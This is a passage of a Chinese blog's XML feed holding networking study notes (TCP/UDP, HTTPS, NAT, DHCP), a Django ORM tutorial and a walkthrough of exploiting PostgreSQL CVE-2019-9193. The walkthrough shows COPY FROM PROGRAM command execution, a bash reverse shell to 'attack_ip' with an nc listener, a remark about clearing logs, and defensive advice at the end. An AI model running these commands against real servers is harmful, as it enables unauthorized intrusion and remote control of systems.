href="#去中心化网络（DHT）：" class="headerlink" title="去中心化网络（DHT）："></a>去中心化网络（DHT）：</h3><p>Kademlia 协议是著名的DHT协议，在 DHT 网络里面，每一个 DHT node 都有一个 ID。这个 ID 是一个很长的串。每个 DHT node 都有责任掌握一些知识，也就是文件索引，每个 DHT node 使用哈希算法计算出需要保存的文件索引。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>流媒体</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：10-13讲</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A10-13%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A10-13%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>总结/思考：<br>UDP协议<br>UDP协议的首部有8个字节，一共四个字段，每个字段的长度都是2个字节，16比特（位）。<br>UDP 特点<br>1、无连接：UDP是无连接的协议，他在进行数据传输之前不需要先建立连接，也没有各种重传机制、拥塞控制和流量控制，所以传输速度很快，消耗很低，延迟小，数据传输效率高，适合对可靠性要求不高的应用程序，或者可以保障可靠性的应用程序，如DNS、TFTP、SNMP等。<br>2、不可靠：只负责数据的发送，不关心数据是否送达，没有确认机制，主机收到数据也不会有响应<br>3、分组首部开销小，TCP的首部是20字节，UDP的首部是8字节<br>4、面向报文的：TCP(面向连接的传输控制协议)是面向字节传输，而UDP是面向报文传输，对于应用层交下来的报文段不进行拆分合并，直接保留原有报文段的边界然后添加UDP的首部就交付给网络层。不论报文的长短，UDP都不会进行处理。因此为了避免报文段过短降低传输效率以及报文段过长导致网络层对IP数据进行分片操作，应用层应该选择合适长度的报文交付给运输层的UDP。</p><p>TCP协议<br>TCP 用于从应用程序到网络的数据传输控制。<br>TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。<br>是面向连接的、可靠的、基于字节流的传输层通信协议。<br>TCP 特点<br>1、点对点（不能广播、多播），面向连接<br>2、双向传递（全双工）<br>3、字节流：打包成报文段、保证有序接收、重复报文自动丢弃<br>     缺点：不维护应用报文的边界（需要HTTP协议自己定义/r/n或content length进行结尾、GRPC）<br>     优点：不强制要求应用必须离散的创建数据块，不限制数据块大小<br>4、流量缓存：解决速度不匹配问题（滑动窗口）<br>5、可靠的传输服务（保证可达，丢包时通过重发进而增加时延实现可靠性）<br>6、拥塞控制</p><p>MSS：Max Segment Size<br>定义：仅指TCP承载数据，不包含TCP头部大小，参见RFC879<br>MSS选择目的：<br>尽量每个Segment报文段携带更多的数据，以减少头部空间占用比率<br>防止Segment被某个设备的IP层基于MTU拆分<br>默认MSS：536字节（标准默认MTU576字节，20字节IP头部，20字节TCp头部）</p><p>滑动窗口<br>是TCP流量控制的一个手段。这里说的窗口，指的是接收通告窗口（Receiver Window，RWND）。它告诉对方本端的TCP接收缓冲区还能容纳多少字节的数据，这样对方就可以控制发送数据的速度。</p><p>拥塞控制<br>拥塞控制包含四个方式：慢启动、拥塞避免、快速重传和快速恢复，用于应对通信网络环境差时的丢包问题<br>丢包情况严重时采用慢启动+拥塞避免方式；当丢包情况不严重时，可进行快速重传和快速恢复方式；不一定会进入慢启动状态.</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：14-15讲</title>
    <link href="/2020/09/26/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A14-15%E8%AE%B2/"/>
    <url>/2020/09/26/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A14-15%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="HTTP请求格式"><a href="#HTTP请求格式" class="headerlink" title="HTTP请求格式"></a>HTTP请求格式</h3><p>HTTP的报文主要分为1、请求行；2、请求首部；3、请求体</p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>HTTP请求行中包含请求方法（GET、POST、PATCH等）、URL、和HTTP版本</p><h4 id="首部字段"><a href="#首部字段" class="headerlink" title="首部字段"></a>首部字段</h4><p>首部字段用K：V方式表示；如我们请求一个网站，服务器给我们返回等应答中头部字段；客户端同样可以构造<br>请求头部字段<br>accept-ranges: bytes<br>access-control-allow-origin: *<br>age: 3035367<br>cache-control: max-age=31536000<br>content-length: 8035<br>content-type: image/png</p><h4 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a>请求体</h4><p>请求等实体内容</p><h3 id="HTTP返回格式"><a href="#HTTP返回格式" class="headerlink" title="HTTP返回格式"></a>HTTP返回格式</h3><p>HTTP响应报文主要包括1、状态行；2、首部；3、响应实体</p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>状态行包括HTTP版本、状态码、和描述响应结果等短语，如“ok”</p><h4 id="首部和响应实体"><a href="#首部和响应实体" class="headerlink" title="首部和响应实体"></a>首部和响应实体</h4><p>首部和响应实体与请求报文意义一样</p><h3 id="QUIC协议"><a href="#QUIC协议" class="headerlink" title="QUIC协议"></a>QUIC协议</h3><p>QUIC 协议通过基于 UDP 自定义的类似 TCP 的连接、重试、多路复用、流量控制技术，进<br>一步提升性能。</p><h3 id="HTTP-加密传输"><a href="#HTTP-加密传输" class="headerlink" title="HTTP 加密传输"></a>HTTP 加密传输</h3><p>HTTP在网络中是以明文方式传输等，存在中间人攻击等安全隐患，为确保安全需要采用加密传输，目前加密方式分为对称加密和非对称加密两种</p><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><p>客户端和服务端使用同一个密钥加解密数据，但是密钥等传输一般只能通过线下传输，在客户端多等情况下，一对一为客户端提供密钥就不太实际<br>####非对称加密<br>客户端和服务端都有各自等公钥和私钥。同时客户端提供自己等公钥给服务端，客户端和服务端向彼此发送数据时，都是使用对方等公钥进行加密，这样就只有对方才具备私钥解密数据。采用客户端向服务端提供公钥的方式可以解决密钥传输的问题</p><h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p>由权威机构对公钥进行认证，颁发证书，证书一般包含公钥、证书所有者信息、证书发布机构和证书有效期等信息，用于加强公钥等可信度。</p><h3 id="HTTPS工作方式"><a href="#HTTPS工作方式" class="headerlink" title="HTTPS工作方式"></a>HTTPS工作方式</h3><p>建立HTTPS连接时：<br>1、客户端：以明文传输 TLS 版本信息、加密套件候选列表、压缩算法候选列表等信息和一个随机数（在协商对称密钥的时候使用）给服务端<br>2、服务端：向客户端发送服务器选择使用的协议版本、加密套件、压缩算法等和一个随机数（用于后续的密钥协商）;以及服务端的证书<br>3、客户端：验证服务端证书，验证证书可信后，客户端计算产生随机数字 Pre-master，发送 Client Key Exchange，用证书中的公钥加密，再发送给服务器，服务器可以通过私钥解密<br>客户端还是服务器，都有了三个随机数，分别是：自己的、对端的，以及刚生成的 Pre-Master 随机数。通过这三个随机数，可以在客户端和服务器产生相同的对称密钥。<br>后续的数据传输便使用对称密钥加密<br>HTTPS采用非对称加密的方式传输密钥，对称加密的方式传输数据，解决了密钥传输的安全问题，同时也提高了数据传输的效率。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：5-9讲</title>
    <link href="/2020/09/06/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A5-9%E8%AE%B2/"/>
    <url>/2020/09/06/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A5-9%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="总结-思考："><a href="#总结-思考：" class="headerlink" title="总结/思考："></a>总结/思考：</h3><p>第8讲中关于NAT的映射讲的比较模糊，没有讲明从公网访问过来的包怎么准确的NAT到对应的内外IP上，自行google了NAT的原理，做下总结：</p><h3 id="NAT（IP-Network-Address-Translator）"><a href="#NAT（IP-Network-Address-Translator）" class="headerlink" title="NAT（IP Network Address Translator）"></a>NAT（IP Network Address Translator）</h3><h4 id="NAT技术使用原因和场景"><a href="#NAT技术使用原因和场景" class="headerlink" title="NAT技术使用原因和场景"></a>NAT技术使用原因和场景</h4><p>原因：公务IP数量少，主机数量多，无法给每个主机都分配一个公网IP，因此就需要多台内网主机共享一个公网IP。<br>使用场景：<br>1）内网中主要用于客户端访问互联网<br>2）同一时间仅少量主机访问互联网<br>3）内网中存在一个路由器负责访问外网</p><h4 id="单向（向外）转换NAT：动态映射"><a href="#单向（向外）转换NAT：动态映射" class="headerlink" title="单向（向外）转换NAT：动态映射"></a>单向（向外）转换NAT：动态映射</h4><p>同一时间内仅有少量主机可访问公网，路由器为这些内网主机临时配置1对1的公网IP-内网IP映射关系；<br>存在问题：同一时间访问公网的主机数量多时，就需要对应数量的公网IP了。</p><h4 id="双向（向内）NAT：IP地址静态映射"><a href="#双向（向内）NAT：IP地址静态映射" class="headerlink" title="双向（向内）NAT：IP地址静态映射"></a>双向（向内）NAT：IP地址静态映射</h4><p>使用场景：当公网主机想主动访问一个内网IP的时候，单向NAT和NAPT技术都无法实现，只能依靠双向NAT技术；<br>原理：NAT路由器会将内网IP和出口公网IP做一个静态都映射记录，访问出口公网IP都将映射都内网IP上。<br>缺点：无法使用端口映射，使用场景较少。</p><h3 id="NAPT端口映射（Network-Address-Port-Translation）"><a href="#NAPT端口映射（Network-Address-Port-Translation）" class="headerlink" title="NAPT端口映射（Network Address Port Translation）"></a>NAPT端口映射（Network Address Port Translation）</h3><p>原理：如本地电脑访问知乎，本地客户端会和知乎服务器建立一个TCP连接，操作系统使用如7000端口和本机IP（172.18.68.69）作为源IP端口，目的IP端口为103.41.167.234:80；NAT路由器则会把源IP映射为路由器上出口的公网IP194.54.21.7，并将源端口修改为一个随机的如7224端口（这里路由器修改了传输层的数据），发送往服务器，再服务器发回数据包后，在通过映射记录，修改发往本地的目的IP和端口，从而实现多台主机公用一个公网IP。</p><h3 id="NAT技术优缺点"><a href="#NAT技术优缺点" class="headerlink" title="NAT技术优缺点"></a>NAT技术优缺点</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>共享公共IP地址，节约开支<br>扩展主机时不涉及公共地址<br>更换ISP服务商不会对主机地址产生影响<br>更好都安全性，外网服务无法主动访问内网服务<br>更好都隔离性</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><p>网络管理复杂<br>性能下降，每个数据包都要进行源/目IP端口都修改<br>重新修改校验和，因为数据包内容被修改<br>客户端缺乏公网IP导致一些功能缺失</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>NAT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：1-4讲</title>
    <link href="/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/"/>
    <url>/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="总结-思考："><a href="#总结-思考：" class="headerlink" title="总结/思考："></a>总结/思考：</h3><p>第四讲中关于DHCP的具体实现过程讲的比较抽象，于是上网google了一下具体的流程</p><h4 id="DHCP的实现"><a href="#DHCP的实现" class="headerlink" title="DHCP的实现"></a>DHCP的实现</h4><p>DHCP实现大致分为4步<br>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。<br>数据包内容：Client端使用IP地址0.0.0.0发送一个目的IP地址位255.255.255.255的广播包，使用的协议为UDP协议。</p><p>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。<br>数据包内容：<br>（1）DHCP服务器仍然使用广播地址作为目的地址，因为此时请求分配IP的Client并没有自己ip,而可能有多个Client在使用0.0.0.0这个IP作为源IP向DHCP服务器发出IP分配请求，DHCP也不能使用0.0.0.0这个IP作为目的IP地址，于是依然采用广播的方式，告诉正在请求的Client们，这是一台可以使用的DHCP服务器。<br>（2）DHCP服务器提供了一个可用的IP,在数据包的Your (client) IP Address字段可以看到DHCP服务器提供的可用IP。<br>（3）除此之外，如图中红色矩形框的内容所示，服务器还发送了子网掩码，路由器，DNS，域名，IP地址租用期等信息。</p><p>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。<br>数据包内容：当Client收到了DHCP Offer包以后（如果有多个可用的DHCP服务器，那么可能会收到多个DHCP Offer包），确认有可以和它交互的DHCP服务器存在，于是Client发送Request数据包，请求分配IP。<br>此时的源IP和目的IP依然是0.0.0.0和255.255.255.255。包中包含客户端的MAC地址、接受的租约中的IP地址、提供此租约的DHCP服务器地址等）。告诉所有DHCP服务器它将接受哪一台服务器（一般是最先到达的server）提供的IP地址，所有其他的DHCP服务器撤销它们的提供以便将IP地址提供给下一次IP租用请求。</p><p>第四步：DHCP Server发送ACK数据包，确认信息。<br>数据包内容：在数据包中包含以下信息，表示将这些资源信息分配给Client.<br>Your(client) IP address:分配给Client的可用IP。<br>后面有许多项option信息，前两项是DHCP服务器发送的消息类型（ACK）和服务器的身份标识，后面几项是：<br>Subnet Mask:Client端分配到的IP的子网掩码；<br>Router:路由器<br>Domain Name Server:DNS,域名服务器<br>Domain Name:域名<br>IP Address Lease Time:IP租用期。</p><p>后续：客户端在接收到DHCP ack广播后，会向网络发送三个针对此IP地址的ARP解析请求以执行冲突检测，查询网络上有没有其它机器使用该IP地址；如果发现该IP地址已经被使用，客户机会发出一个DHCP decline数据包给DHCP服务器，拒绝此IP地址租约，并重新发送DHCP discover信息。此时，在DHCP服务器管理控制台中，会显示此IP地址为BAD_ADDRESS。<br>如果网络上没有其它主机使用此IP地址，则客户机的TCP/IP使用租约中提供的IP地址完成初始化，从而可以和其他网络中的主机进行通讯。</p><h4 id="DHCP缺点："><a href="#DHCP缺点：" class="headerlink" title="DHCP缺点："></a>DHCP缺点：</h4><p>1.DHCP不能查出网络上非DHCP客户机已经在使用的IP地址，例如网络有一非DHCP客户机A已经手工分配了IP地址:100.53.46.5，但是DHCP服务器并不能识别出该地址已经被分配了，它向DHCP客户机配了一个重复的IP地址:100.53.46.5，这就导致了IP地址的冲突。当然，这些IP地址可以从被配置在DHCP服务器上的任何范围中排除。<br>2.当网络上存在两个DHCP服务器时，一个DHCP服务器不和另一个DHCP服务器通信，就不能查出已被其他服务器租出去的IP地址。因此，两个DHCP服务器不应该在它们各自的范围中使用相同的IP地址。此外，DHCP服务器不能跨路由器与客户机通信，除非路由器允许BOOTP转发，或者子网允许DHCP中转借。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>DHCP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Django model篇（一）：update用法介绍</title>
    <link href="/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="model-update常用方法"><a href="#model-update常用方法" class="headerlink" title="model update常用方法"></a>model update常用方法</h3><p>方法一：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(username=<span class="hljs-string">'tachiulam'</span>,is_active=<span class="hljs-literal">True</span>)</code></pre><p>方法二：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><p>方法一适合更新一批数据，类似于mysql语句update user set username=’tachiulam’ where id = 1</p><p>方法二适合更新一条数据，也只能更新一条数据，当只有一条数据更新时推荐使用此方法，另外此方法还有一个好处，我们接着往下看</p><h3 id="具有auto-now属性字段的更新"><a href="#具有auto-now属性字段的更新" class="headerlink" title="具有auto_now属性字段的更新"></a>具有auto_now属性字段的更新</h3><p>我们通常会给表添加三个默认字段</p><ul><li><p>自增ID，这个django已经默认加了，就像上边的建表语句，虽然只写了username和is_active两个字段，但表建好后也会有一个默认的自增id字段</p></li><li><p>创建时间，用来标识这条记录的创建时间，具有auto_now_add属性，创建记录时会自动填充当前时间到此字段</p></li><li><p>修改时间，用来标识这条记录最后一次的修改时间，具有auto_now属性，当记录发生变化时填充当前时间到此字段<br>就像下边这样的表结构</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)</code></pre><p>当表有字段具有auto_now属性且你希望他能自动更新时，必须使用上边方法二的更新，不然auto_now字段不会更新，也就是：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><h3 id="json-dict类型数据更新字段"><a href="#json-dict类型数据更新字段" class="headerlink" title="json/dict类型数据更新字段"></a>json/dict类型数据更新字段</h3><p>目前主流的web开放方式都讲究前后端分离，分离之后前后端交互的数据格式大都用通用的json型，那么如何用最少的代码方便的更新json格式数据到数据库呢？同样可以使用如下两种方法：</p><p>方法一：</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;User.objects.filter(id=<span class="hljs-number">1</span>).update(**data)</code></pre><ul><li><p>同样这种方法不能自动更新具有auto_now属性字段的值</p></li><li><p>通常我们再变量前加一个星号(*)表示这个变量是元组/列表，加两个星号表示这个参数是字典</p></li></ul><p>方法二：</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**data)_t.save()</code></pre><ul><li><p>方法二和方法一同样无法自动更新auto_now字段的值</p></li><li><p>注意这里使用到了一个dict方法</p></li></ul><p>方法三：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><h3 id="ForeignKey字段更新"><a href="#ForeignKey字段更新" class="headerlink" title="ForeignKey字段更新"></a>ForeignKey字段更新</h3><p>假如我们的表中有Foreignkey外键时，该如何更新呢？</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)</code></pre><p>方法一：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(role=<span class="hljs-number">2</span>)</code></pre><ul><li><p>最简单的方法，直接让给role字段设置为一个id即可</p></li><li><p>当然也可以用dict作为参数更新：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:<span class="hljs-number">3</span>&#125;)</code></pre></li></ul><p>方法二：</p><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">2</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(role=_role)</code></pre><ul><li><p>也可以赋值一个实例给role</p></li><li><p>当然也可以用dict作为参数更新：</p></li></ul><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">1</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:_role&#125;)</code></pre><p>方法三：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><ul><li><p>注意：这里的role必须赋值为一个对象，不能写id，不然会报错”User.role” must be a “Role” instance</p></li><li><p>当使用dict作为参数更新时又有一点不同，如下代码：</p></li></ul><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role_id'</span>:<span class="hljs-number">2</span>&#125;)_t.save()</code></pre><ul><li><p>Foreignkey外键必须加上<code>_id</code>，例如：{‘role_id’:3}</p></li><li><p>role_id后边必须跟一个id（int或str类型都可），不能跟role实例</p></li></ul><h3 id="ManyToManyField字段更新"><a href="#ManyToManyField字段更新" class="headerlink" title="ManyToManyField字段更新"></a>ManyToManyField字段更新</h3><p>假如我们的表中有ManyToManyField字段时更新又有什么影响呢？</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)    groups = models.ManyToManyField(Group, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'组'</span>)</code></pre><p>m2m更新：m2m字段没有直接更新的方法，只能通过清空再添加的方法更新了</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.groups.clear()_t.groups.add(*[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])_t.save()</code></pre><ul><li><p>add()：m2m字段添加一个值，当有多个值的时候可用列表，参照上边例子</p></li><li><p>_t.groups.add(2)</p></li><li><p>_t.groups.add(Group.objects.get(id=2))</p></li><li><p>remove()：m2m字段移除一个值，，当有多个值的时候可用列表，参照上边例子</p></li><li><p>_t.groups.remove(2)</p></li><li><p>_t.groups.remove(Group.objects.get(id=2))</p></li><li><p>clear()：清空m2m字段的值</p></li></ul><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDY1MzcyOQ==&mid=2247483702&idx=1&sn=720529d0cd15ecf11e07392d5da33a47&scene=21#wechat_redirect" target="_blank" rel="noopener">🔗原文链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Django</category>
      
      <category>model</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQL任意命令执行漏洞利用（CVE-2019-9193)</title>
    <link href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/"/>
    <url>/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/</url>
    
    <content type="html"><![CDATA[<p>最近没事曰曰内网，偶然发现了一个使用空密码的pg（是的，连爆破都省了）。用navicat连上去看了下几个库都是一些业务测试数据，没什么好收集；不死心，google了一下发现有个比较新的CVE好像可以操作一下~</p><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>最近，安全研究人员披露了PostgreSQL实例代码执行漏洞（CVE-2019-9193）的漏洞细节。具有数据库 服务器 文件读取权限的攻击者可以利用此漏洞执行任意系统命令。</p><p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令。</p><p>**受影响的版本（貌似更新版本无解）</p><p>PostgreSQL&gt; = 9.3**</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="pg数据库连接"><a href="#pg数据库连接" class="headerlink" title="pg数据库连接"></a>pg数据库连接</h5><pre><code class="hljs plain"># 连接postgressql，虽然是内网ip但还是打一下码吧psql -U postgres -h 172.xx.xxx.xx</code></pre><p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="开始攻击（直接套用网上POC）"><a href="#开始攻击（直接套用网上POC）" class="headerlink" title="开始攻击（直接套用网上POC）"></a>开始攻击（直接套用网上POC）</h5><pre><code class="hljs plain"># 删除并创建用于保存系统命令执行结果的表 DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);# 命令执行测试，多试几条COPY cmd_exec FROM PROGRAM &#39;id&#39;;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;# 查看结果SELECT * FROM cmd_exec;</code></pre><p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>我的🐎，还是个root用户，，都不用提权了（这安全意识阿。。。）</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>虽然都可以执行系统命令了，拿不拿shell无所谓，但拿了还是要方便一些；</p><pre><code class="hljs plain"># attack机器上开启监听nc -lvnp 8888# 利用pg执行远程连接命令COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre><p>attack机器已经返回shell连接了~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p><p>记录一下，顺便清除记录收工了。</p><h4 id="解决方案建议"><a href="#解决方案建议" class="headerlink" title="解决方案建议"></a>解决方案建议</h4><p>1、pg_read_server_files，pg_write_server_files和pg_execute_server_program角色涉及读取和写入具有大权限的数据库服务器文件。将此角色权限分配给数据库用户时，应慎重考虑。</p><p>2、使用强密码！！！</p><p>3、进行网络隔离，只允许需要的IP连接；</p><p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问漏洞利用</title>
    <link href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
